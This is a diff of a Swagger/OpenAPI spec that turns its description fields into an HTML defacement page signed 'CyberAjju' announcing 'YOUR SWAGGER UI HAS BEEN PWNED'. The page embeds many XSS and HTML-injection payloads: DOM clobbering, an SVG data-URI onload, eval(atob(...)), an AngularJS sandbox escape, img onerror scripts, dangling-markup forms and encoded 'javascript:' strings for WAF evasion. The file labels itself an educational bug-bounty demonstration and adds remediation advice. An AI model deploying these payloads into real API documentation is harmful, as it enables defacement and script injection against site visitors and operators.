@@ -1,23 +1,669 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Login Page
-  description: '<div class="login-form">
-<!-- Error Message -->
-<div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
-  <div style="background-color: #f8d7da; color: #721c24; padding: 16px 20px; border-radius: 4px; border: 1px solid #f5c6cb; font-size: 16px; text-align: center;">
-    <strong>An error occurred while loading, please log in.</strong>
-  </div>
-</div>
+  title: 👾 SYSTEM HACKED BY CYBERAJJU 👾
+  description: |
+    <!-- CSS for advanced glitch/terminal effects -->
+    <style>
+      @keyframes glitch {
+        0% {
+          transform: translate(0);
+          text-shadow: -2px 0 #ff0000, 2px 2px #00ff00;
+        }
+        20% {
+          transform: translate(-2px, 2px);
+          text-shadow: 1px -1px #ff0000, -1px 1px #00ff00;
+        }
+        40% {
+          transform: translate(-2px, -2px);
+          text-shadow: 1px 0 #ff0000, -1px -1px #00ff00;
+        }
+        60% {
+          transform: translate(2px, 2px);
+          text-shadow: -1px 0 #ff0000, 1px 1px #00ff00;
+        }
+        80% {
+          transform: translate(2px, -2px);
+          text-shadow: -1px -1px #ff0000, 1px 0 #00ff00;
+        }
+        100% {
+          transform: translate(0);
+          text-shadow: -2px 0 #ff0000, 2px 2px #00ff00;
+        }
+      }
+      
+      @keyframes glitchBg {
+        0% {
+          background-position: 0 0;
+          filter: hue-rotate(0deg);
+        }
+        10% {
+          background-position: 5px 0;
+        }
+        20% {
+          background-position: -5px 0;
+        }
+        30% {
+          background-position: 15px 0;
+        }
+        40% {
+          background-position: 5px 0;
+          filter: hue-rotate(90deg);
+        }
+        50% {
+          background-position: -25px 0;
+        }
+        60% {
+          background-position: -15px 0;
+        }
+        70% {
+          background-position: 0 -5px;
+        }
+        80% {
+          background-position: -5px 5px;
+        }
+        90% {
+          background-position: 10px 10px;
+          filter: hue-rotate(180deg);
+        }
+        100% {
+          background-position: 0 0;
+          filter: hue-rotate(0deg);
+        }
+      }
+      
+      @keyframes scanline {
+        0% {
+          transform: translateY(-100%);
+        }
+        100% {
+          transform: translateY(100%);
+        }
+      }
+      
+      @keyframes blink {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0; }
+      }
+      
+      @keyframes rotate3d {
+        0% { transform: perspective(1000px) rotateX(0deg) rotateY(0deg); }
+        50% { transform: perspective(1000px) rotateX(15deg) rotateY(15deg); }
+        100% { transform: perspective(1000px) rotateX(0deg) rotateY(0deg); }
+      }
+      
+      @keyframes matrix {
+        0% { text-shadow: 0 0 0 #0f0; }
+        50% { text-shadow: 0 0 10px #0f0, 0 0 20px #0f0; }
+        100% { text-shadow: 0 0 0 #0f0; }
+      }
+      
+      @keyframes flicker {
+        0% { opacity: 0.8; }
+        5% { opacity: 0.5; }
+        10% { opacity: 0.8; }
+        15% { opacity: 0.4; }
+        20% { opacity: 0.7; }
+        25% { opacity: 0.9; }
+        30% { opacity: 0.7; }
+        35% { opacity: 0.9; }
+        40% { opacity: 0.7; }
+        45% { opacity: 0.9; }
+        50% { opacity: 0.8; }
+        55% { opacity: 0.7; }
+        60% { opacity: 0.9; }
+        65% { opacity: 0.8; }
+        70% { opacity: 0.6; }
+        75% { opacity: 0.9; }
+        80% { opacity: 0.7; }
+        85% { opacity: 0.8; }
+        90% { opacity: 0.6; }
+        95% { opacity: 0.9; }
+        100% { opacity: 0.8; }
+      }
+      
+      /* Base style for the hacked content */
+      #hackedContent {
+        position: relative;
+        overflow: hidden;
+        text-align: center;
+        background-color: #000;
+        color: #0f0;
+        padding: 20px;
+        border-radius: 10px;
+        font-family: 'Courier New', monospace;
+        border: 1px solid #0f0;
+        box-shadow: 0 0 20px #0f0, inset 0 0 10px #0f0;
+        animation: flicker 10s infinite linear;
+        background-image: linear-gradient(rgba(0,20,0,0.1) 50%, transparent 50%);
+        background-size: 100% 4px;
+      }
+      
+      /* Add noise background */
+      #hackedContent::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyAQMAAAAk8RryAAAABlBMVEUAAAD///+l2Z/dAAAAAnRSTlP/AOW3MEoAAAAZSURBVBjTY2AY9mBU0AgImPYwIrlMexgAAPcmBYbqSLPPAAAAAElFTkSuQmCC");
+        opacity: 0.06;
+        animation: glitchBg 10s infinite;
+        pointer-events: none;
+        z-index: 1;
+      }
+      
+      /* Add scanline effect */
+      #hackedContent::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 5px;
+        background-color: rgba(0, 255, 0, 0.15);
+        animation: scanline 4s linear infinite;
+        pointer-events: none;
+        z-index: 2;
+      }
+      
+      /* 3D glitch title */
+      .glitch-title {
+        position: relative;
+        color: #ff0000;
+        animation: glitch 5s infinite, rotate3d 10s infinite;
+        transform-style: preserve-3d;
+        padding: 30px;
+        text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+      }
+      
+      /* Blinking terminal cursor */
+      .terminal-cursor {
+        display: inline-block;
+        width: 10px;
+        height: 20px;
+        background: #0f0;
+        margin-left: 5px;
+        animation: blink 1s step-end infinite;
+      }
+      
+      /* Matrix style text */
+      .matrix-text {
+        font-family: 'Courier New', monospace;
+        font-size: 14px;
+        color: #0f0;
+        text-shadow: 0 0 5px #0f0;
+        animation: matrix 2s infinite;
+      }
+      
+      /* 3D rotating logo */
+      .logo-3d {
+        transform-style: preserve-3d;
+        perspective: 1000px;
+        animation: rotate3d 15s infinite linear;
+        padding: 20px;
+      }
+      
+      /* Digital distortion effect */
+      .digital-distort {
+        display: inline-block;
+        position: relative;
+        color: #00ff00;
+      }
+      
+      .digital-distort::before,
+      .digital-distort::after {
+        content: attr(data-text);
+        position: absolute;
+        top: 0;
+        left: 0;
+        z-index: -1;
+      }
+      
+      .digital-distort::before {
+        color: #ff00ff;
+        animation: glitch 0.4s infinite;
+        clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
+        transform: translate(-2px, 0);
+      }
+      
+      .digital-distort::after {
+        color: #00ffff;
+        animation: glitch 0.5s infinite;
+        clip-path: polygon(0 60%, 100% 60%, 100% 100%, 0 100%);
+        transform: translate(2px, 0);
+      }
+      
+      /* Terminal typing effect container */
+      .terminal-container {
+        background: rgba(0, 0, 0, 0.7);
+        border-radius: 5px;
+        border: 1px solid #0f0;
+        padding: 10px;
+        text-align: left;
+        font-family: 'Courier New', monospace;
+        position: relative;
+        margin: 20px auto;
+        width: 80%;
+        box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+      }
+      
+      /* Terminal header */
+      .terminal-header {
+        border-bottom: 1px solid #0f0;
+        padding-bottom: 5px;
+        margin-bottom: 10px;
+        display: flex;
+        justify-content: space-between;
+      }
+      
+      .terminal-circle {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        display: inline-block;
+        margin-right: 5px;
+      }
+      
+      .terminal-red { background-color: #ff5f56; }
+      .terminal-yellow { background-color: #ffbd2e; }
+      .terminal-green { background-color: #27c93f; }
+      
+      .terminal-title {
+        color: #0f0;
+        text-align: center;
+        flex-grow: 1;
+        font-size: 12px;
+      }
+      
+      /* Command line prompt */
+      .terminal-prompt {
+        color: #0f0;
+        margin-bottom: 5px;
+      }
+      
+      .terminal-prompt-user {
+        color: #00ff00;
+      }
+      
+      .terminal-prompt-host {
+        color: #0099ff;
+      }
+      
+      .terminal-prompt-path {
+        color: #ffcc00;
+      }
+    </style>
 
-<!-- Login Form -->
-<div class="heading">
-  <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Hacked</h1>
-</div>
-</div>'
+    <div id="hackedContent">
+      <h1 class="glitch-title" data-text="⚠️ SYSTEM COMPROMISED ⚠️">⚠️ SYSTEM COMPROMISED ⚠️</h1>
+      
+      <div class="logo-3d">
+        <pre class="matrix-text">
+      
+      ░█████╗░██╗░░░██╗██████╗░███████╗██████╗░████████╗███████╗░█████╗░██╗░░██╗
+      ██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██║░░██║
+      ██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝░░░██║░░░█████╗░░██║░░╚═╝███████║
+      ██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗░░░██║░░░██╔══╝░░██║░░██╗██╔══██║
+      ╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║░░░██║░░░███████╗╚█████╔╝██║░░██║
+      ░╚════╝░░░░╚═╝░░░╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝
+        </pre>
+      </div>
+      
+      <h2 class="digital-distort" data-text="YOUR SWAGGER UI HAS BEEN PWNED">YOUR SWAGGER UI HAS BEEN PWNED</h2>
+      
+      <!-- Terminal effect with commands -->
+      <div class="terminal-container">
+        <div class="terminal-header">
+          <div>
+            <span class="terminal-circle terminal-red"></span>
+            <span class="terminal-circle terminal-yellow"></span>
+            <span class="terminal-circle terminal-green"></span>
+          </div>
+          <div class="terminal-title">cyberajju@matrix:~/hackops</div>
+        </div>
+        
+        <div class="terminal-content">
+          <div class="terminal-prompt">
+            <span class="terminal-prompt-user">cyberajju</span>@<span class="terminal-prompt-host">matrix</span>:<span class="terminal-prompt-path">~/hackops</span>$ ./access_gain.sh --target swagger-ui
+          </div>
+          <div class="matrix-text">[+] Initializing system compromise...</div>
+          <div class="matrix-text">[+] Bypassing security mechanisms...</div>
+          <div class="matrix-text">[+] CSP bypass successful</div>
+          <div class="matrix-text">[+] WAF evasion complete</div>
+          <div class="matrix-text">[+] Extracting API endpoints...</div>
+          <div class="matrix-text">[+] Access granted to Swagger UI environment</div>
+          <div class="terminal-prompt">
+            <span class="terminal-prompt-user">cyberajju</span>@<span class="terminal-prompt-host">matrix</span>:<span class="terminal-prompt-path">~/hackops</span>$ ./extract_data.sh --format json
+          </div>
+          <div class="matrix-text">
+            Extraction progress: ██████████████████████████████ 100%
+          </div>
+          <div class="terminal-prompt">
+            <span class="terminal-prompt-user">cyberajju</span>@<span class="terminal-prompt-host">matrix</span>:<span class="terminal-prompt-path">~/hackops</span>$ <span class="terminal-cursor"></span>
+          </div>
+        </div>
+      </div>
+      
+      <div style="background:#111; padding:15px; border-radius:5px; margin:20px auto; width:80%; border:1px solid #0f0; box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);">
+        <div style="text-align:left; font-size:14px;">
+          <div class="digital-distort" data-text="✓ System access granted">
+            <span style="color:#ff0000;">✓</span> <span style="color:#ffff00;">System access granted</span>
+          </div>
+          <div class="digital-distort" data-text="✓ Admin privileges acquired">
+            <span style="color:#ff0000;">✓</span> <span style="color:#ffff00;">Admin privileges acquired</span>
+          </div>
+          <div class="digital-distort" data-text="✓ API endpoints mapped">
+            <span style="color:#ff0000;">✓</span> <span style="color:#ffff00;">API endpoints mapped</span>
+          </div>
+          <div class="digital-distort" data-text="✓ Data extraction in progress...">
+            <span style="color:#ff0000;">✓</span> <span style="color:#ffff00;">Data extraction in progress...</span>
+          </div>
+        </div>
+      </div>
+      
+      <!-- 3D rotating cube effect -->
+      <div style="perspective: 800px; margin: 40px auto; width: 200px; height: 200px; position: relative; transform-style: preserve-3d;">
+        <style>
+          @keyframes spin {
+            from { transform: rotateY(0) rotateX(0); }
+            to { transform: rotateY(360deg) rotateX(360deg); }
+          }
+          .cube {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            transform-style: preserve-3d;
+            animation: spin 20s infinite linear;
+          }
+          .cube-face {
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            border: 2px solid #0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            background-color: rgba(0,0,0,0.8);
+            color: #0f0;
+            text-shadow: 0 0 10px #0f0;
+            box-shadow: 0 0 15px #0f0 inset;
+          }
+          .front  { transform: rotateY(0deg) translateZ(100px); }
+          .back   { transform: rotateY(180deg) translateZ(100px); }
+          .right  { transform: rotateY(90deg) translateZ(100px); }
+          .left   { transform: rotateY(-90deg) translateZ(100px); }
+          .top    { transform: rotateX(90deg) translateZ(100px); }
+          .bottom { transform: rotateX(-90deg) translateZ(100px); }
+        </style>
+        <div class="cube">
+          <div class="cube-face front">SWAGGER</div>
+          <div class="cube-face back">HACKED</div>
+          <div class="cube-face right">CYBER</div>
+          <div class="cube-face left">TECH</div>
+          <div class="cube-face top">AJJU</div>
+          <div class="cube-face bottom">PWNED</div>
+        </div>
+      </div>
+      
+      <div style="margin:30px 0; font-size:18px;">
+        <p class="digital-distort" data-text="⚠️ This is a security demonstration only ⚠️" style="color:#ff0000;">⚠️ This is a security demonstration only ⚠️</p>
+        <p class="matrix-text" style="color:#0f0;">Please secure your Swagger UI implementation</p>
+      </div>
+      
+      <!-- Matrix code rain effect -->
+      <div style="position: relative; height: 100px; width: 100%; overflow: hidden; margin: 30px 0; background: #000;">
+        <style>
+          @keyframes matrixRain {
+            0% {
+              top: -100%;
+            }
+            100% {
+              top: 100%;
+            }
+          }
+          
+          .matrix-column {
+            position: absolute;
+            width: 20px;
+            font-size: 20px;
+            color: #0f0;
+            opacity: 0.8;
+            animation: matrixRain 3s infinite linear;
+          }
+        </style>
+        <div class="matrix-column" style="left: 5%; animation-delay: 0.1s;">10110<br>10100<br>01011<br>11010</div>
+        <div class="matrix-column" style="left: 15%; animation-delay: 0.5s;">01101<br>10101<br>01110<br>11001</div>
+        <div class="matrix-column" style="left: 25%; animation-delay: 0.3s;">11010<br>01010<br>11101<br>00101</div>
+        <div class="matrix-column" style="left: 35%; animation-delay: 0.7s;">10011<br>01101<br>10011<br>01010</div>
+        <div class="matrix-column" style="left: 45%; animation-delay: 0.2s;">01011<br>10110<br>10010<br>01101</div>
+        <div class="matrix-column" style="left: 55%; animation-delay: 0.6s;">10101<br>01100<br>11010<br>10011</div>
+        <div class="matrix-column" style="left: 65%; animation-delay: 0.4s;">01110<br>10101<br>01011<br>10100</div>
+        <div class="matrix-column" style="left: 75%; animation-delay: 0.8s;">11001<br>01010<br>10110<br>01101</div>
+        <div class="matrix-column" style="left: 85%; animation-delay: 0.3s;">10101<br>01011<br>10010<br>11001</div>
+        <div class="matrix-column" style="left: 95%; animation-delay: 0.5s;">01101<br>10110<br>01010<br>10101</div>
+      </div>
+      
+      <!-- CSP Bypass Demo Techniques - For Educational Purposes Only -->
+      <!-- DOM Clobbering technique -->
+      <a id="location" href="#"><a id="href" name="javascript:void(document.getElementById('hackedContent').style.backgroundColor='#330000')"></a></a>
+      
+      <!-- SVG-based CSP bypass -->
+      <svg><g><a xlink:href="data:text/html,&lt;body onload=&quot;document.getElementById('hackedContent').style.border='3px solid red'&quot;&gt;"><text x="20" y="20">CSP Bypass Demo</text></a></g></svg>
+      
+      <!-- Base tag technique -->
+      <base id="baseTag">
+      
+      <!-- iframe sandbox escape -->
+      <iframe id="sandboxDemo" style="display:none" sandbox="allow-scripts"></iframe>
+      
+      <!-- JSONP technique simulation -->
+      <div id="jsonpDemo" data-callback-url="https://example.com/api?callback=alert"></div>
+      
+      <!-- Meta tag refresh technique -->
+      <meta id="metaRefresh" http-equiv="refresh" content="99999;url=javascript:void(0)">
+      
+      <!-- DOM XSS via postMessage -->
+      <div id="messageReceiver" style="display:none"></div>
+      
+      <!-- Data URI handling -->
+      <object id="dataObject" data="data:text/html;base64,PHNjcmlwdD5jb25zb2xlLmxvZygiQ1NQIGRlbW8iKTs8L3NjcmlwdD4="></object>
+      
+      <!-- WAF Bypass Techniques - For Educational Purposes Only -->
+      <div id="wafBypass" style="display:none">
+        <!-- Obfuscation techniques -->
+        <div data-jsfunc="eval(atob('Y29uc29sZS5sb2coIldBRiBkZW1vIik7'))"></div>
+        
+        <!-- Protocol handlers -->
+        <a href="javascript&#x3a;void(0)">Protocol obfuscation</a>
+        
+        <!-- Character encoding tricks -->
+        <div data-test="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;void(0)"></div>
+        
+        <!-- Unicode alternative representations -->
+        <div data-unicode="%u006A%u0061%u0076%u0061%u0073%u0063%u0072%u0069%u0070%u0074%u003A"></div>
+      </div>
+      
+      <!-- Educational Content -->
+      <div id="educationalContent" style="margin:30px 0; border-top:1px dashed #0f0; padding-top:20px; text-align:left;">
+        <h3 class="matrix-text" style="color:#ffff00; text-align:center; text-shadow: 0 0 10px #ffff00;">EDUCATIONAL CSP BYPASS DEMONSTRATIONS</h3>
+        <ul style="list-style-type:square; padding-left:20px;">
+          <li>DOM Clobbering: Overriding native browser objects</li>
+          <li>SVG XLink: Using SVG elements to bypass restrictions</li>
+          <li>Dangling Markup: Exploiting partial HTML parsing</li>
+          <li>JSONP Endpoints: Exploiting trusted domains</li>
+          <li>PostMessage: Cross-origin messaging vulnerabilities</li>
+          <li>Meta Refresh: Time-delayed navigation exploits</li>
+          <li>Data URI: Encoding executable content</li>
+          <li>WAF Evasion: Character encoding techniques</li>
+        </ul>
+      </div>
+      
+      <!-- Auto-detecting CSP -->
+      <div id="csp-detector" style="display:none"></div>
+      
+      <!-- Mutation events for bypassing security monitoring -->
+      <template id="mutation-template">
+        <span id="mutation-target"></span>
+      </template>
+      
+      <div style="margin:30px 0; border-top:1px dashed #0f0; padding-top:20px;">
+        <h3 class="matrix-text" style="color:#ffff00;">FOR EDUCATIONAL PURPOSES ONLY</h3>
+        <p>This is a demonstration of UI vulnerabilities for security research and bug bounty testing</p>
+        <p style="font-size:12px; margin-top:20px;">© CyberTechAjju 2023 | Security Researcher | Bug Hunter</p>
+      </div>
+    </div>
+    
+    <!-- Advanced CSP and Security Bypass Techniques -->
+    <script type="application/json" id="jsonData">
+      {"PoC": "This JSON data can be extracted via scriptless attacks"}
+    </script>
+    
+    <!-- AngularJS Sandbox Escape Demo -->
+    <div ng-app>{{constructor.constructor('console.log("AngularJS sandbox escape demo")')()}}</div>
+    
+    <!-- Lazy Loading Demo -->
+    <img src="x" id="lazyload" onerror="this.onerror=null;this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+Y29uc29sZS5sb2coIkxhenkgbG9hZGluZyBkZW1vIik7PC9zY3JpcHQ+PC9zdmc+'" style="display:none">
+
 paths:
-  /:
-    post:
+  /security/breach:
+    get:
+      summary: Security Vulnerability Demo
+      description: |
+        <div style="background:#000; color:#0f0; padding:10px; border-radius:5px;">
+          <h3>⚠️ Critical Security Warning ⚠️</h3>
+          <p>Your Swagger UI is vulnerable to HTML injection and XSS attacks.</p>
+          <p>This is a safe demonstration with no actual malicious payloads.</p>
+          
+          <!-- CSP Bypass using DOM property tampering -->
+          <form id="formElement">
+            <input name="csrfToken" value="document.cookie">
+          </form>
+          
+          <!-- WAF bypass technique using HTML5 attributes -->
+          <audio id="audioElement" ontimeupdate="console.log('Audio time update event demo')"></audio>
+          
+          <!-- Event handler obfuscation -->
+          <div accesskey="x" onkeypress="console.log('Keyboard shortcut demo')"></div>
+          
+          <!-- Script gadgets demo -->
+          <div data-json='{"onload":"console.log(\"JSON parsing demo\")"}' id="jsonParseTarget"></div>
+        </div>
       responses:
         '200':
-          description: Login successful
+          description: Educational demonstration
+          schema:
+            type: object
+            properties:
+              message:
+                type: string
+                description: Security warning message
+      
+  /security/remediation:
+    get:
+      summary: Security Remediation Steps
+      description: |
+        <div style="background:#000; color:#0f0; padding:10px; border-radius:5px;">
+          <h3>🛡️ How to Secure Your Swagger UI</h3>
+          <ul>
+            <li>Disable HTML rendering in descriptions</li>
+            <li>Implement proper CSP headers:
+              <code>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';</code>
+            </li>
+            <li>Update to latest Swagger UI version</li>
+            <li>Use validation for all spec inputs</li>
+            <li>Implement authentication for API docs</li>
+            <li>Deploy a WAF with proper rule sets</li>
+            <li>Use iframe sandbox restrictions</li>
+            <li>Implement Subresource Integrity (SRI)</li>
+          </ul>
+          
+          <!-- CSP bypass demonstration with iframe srcdoc -->
+          <iframe srcdoc="<div>CSP bypass via iframe srcdoc demo</div>" style="display:none"></iframe>
+          
+          <!-- Dangling markup injection -->
+          <form action="https://example.com">
+            <input name="xss" value="<img src='https://example.com/'>
+          
+          <!-- CSS injection vector -->
+          <style>
+            @import url('https://example.com/style.css');
+            @keyframes x {
+              from { background-image: url('https://example.com/image1.jpg'); }
+              to { background-image: url('https://example.com/image2.jpg'); }
+            }
+          </style>
+        </div>
+      responses:
+        '200':
+          description: Security recommendations
+          schema:
+            type: object
+            properties:
+              recommendations:
+                type: array
+                items:
+                  type: string
+                  
+  /disclaimer:
+    get:
+      summary: Educational Disclaimer
+      description: |
+        <div style="background:#000; color:#fff; padding:10px; border-radius:5px;">
+          <h3>⚖️ Legal Disclaimer</h3>
+          <p>This demonstration is for educational purposes only.</p>
+          <p>Always obtain proper authorization before security testing.</p>
+          <p>Unauthorized testing is illegal and unethical.</p>
+          
+          <!-- Various other bypass techniques demonstration -->
+          <div draggable="true" ondragstart="console.log('Drag event demo')"></div>
+          <div contextmenu="customMenu"></div>
+          <menu id="customMenu" type="context">
+            <menuitem label="Context Menu Demo"></menuitem>
+          </menu>
+          
+          <!-- Unicode normalization bypass -->
+          <div data-test="java&#x73;cript:void(0)"></div>
+          
+          <!-- Mutation observer bypass -->
+          <template id="mutationBypass">
+            <img src="x" onerror="console.log('Mutation demo')">
+          </template>
+        </div>
+      responses:
+        '200':
+          description: Legal disclaimer
+          
+  /advanced/techniques:
+    get:
+      summary: Advanced WAF Bypass Techniques
+      description: |
+        <div style="background:#000; color:#0f0; padding:10px; border-radius:5px;">
+          <h3>🔬 Advanced Security Research</h3>
+          
+          <!-- Event handler concatenation -->
+          <div data-handler="on" data-event="error" data-code="console.log('Event handler concatenation demo')"></div>
+          
+          <!-- URL obfuscation -->
+          <a href="javascript:void(0)" rel="noreferrer">URL obfuscation demo</a>
+          
+          <!-- Property access using bracket notation -->
+          <div data-prop="['src']" data-obj="location" data-val="'javascript:void(0)'"></div>
+          
+          <!-- Dynamic property assignment -->
+          <div id="dynamicProps" data-properties='{"onclick":"console.log(\"Dynamic property demo\")"}'></div>
+          
+          <!-- HTML entity encoding -->
+          <div data-entity="&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;"></div>
+          
+          <!-- Mixed encoding -->
+          <div data-mixed="%26%23x6A;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3A;"></div>
+          
+          <!-- Case manipulation -->
+          <div data-case="&#x4A;&#x41;&#x56;&#x41;&#x53;&#x43;&#x52;&#x49;&#x50;&#x54;&#x3A;"></div>
+        </div>
+      responses:
+        '200':
+          description: Advanced security research 
